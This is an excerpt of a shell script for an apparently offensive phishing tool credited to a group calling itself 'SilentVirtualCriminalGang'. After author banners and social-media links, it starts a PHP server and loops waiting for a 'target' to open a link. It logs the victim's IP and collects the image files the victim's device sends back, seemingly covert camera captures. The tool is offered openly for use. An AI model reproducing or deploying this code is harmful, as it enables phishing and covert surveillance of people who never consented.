...
# Github     : https://github.com/SilentVirtualCriminalGang
# Join Us    : https://www.facebook.com/cyberhuntbd
# Date       : 27-09-2025
# Language   : Shell, HTML, Css
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others

xdg-open "https://www.instagram.com/may_be_kazi?igsh=MnduaThzMTcyNWR4"
...
trap "echo -e '\n${success}Thanks for Using! Visit FB : CyberHunt\n'; exit" 2
...
${red}[${white}1${red}] ${cyan}Tool Owner
...
$red[Author]     ${cyan} :[Kazi Ashrafuzzaman]
$red[Github]     ${cyan} :[https://github.com/SilentVirtualCriminalGang] 
$red[Join us]    ${cyan} :[https://www.facebook.com/cyberhuntbd]
$red[Telegarm]   ${cyan} :[https://t.me/attacker0009]"
printf "${cyan}\nkazi${nc}@${cyan}:)> ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://www.facebook.com/cyberhuntbd"
...
if echo "$status" | grep -q "404"; then
    ...
    echo -e "${success}BUDDY, PHP started succesfully!\n"
fi
sleep 1
rm -rf ip.txt
...
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}HEY, Target opened the link!\n"
    ...
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}FUCKING IMAGE FILE RECEIVED ! Download...\n"
        file=`ls | grep png`
        mv -f $file $FOL
        rm -rf log.txt
    fi
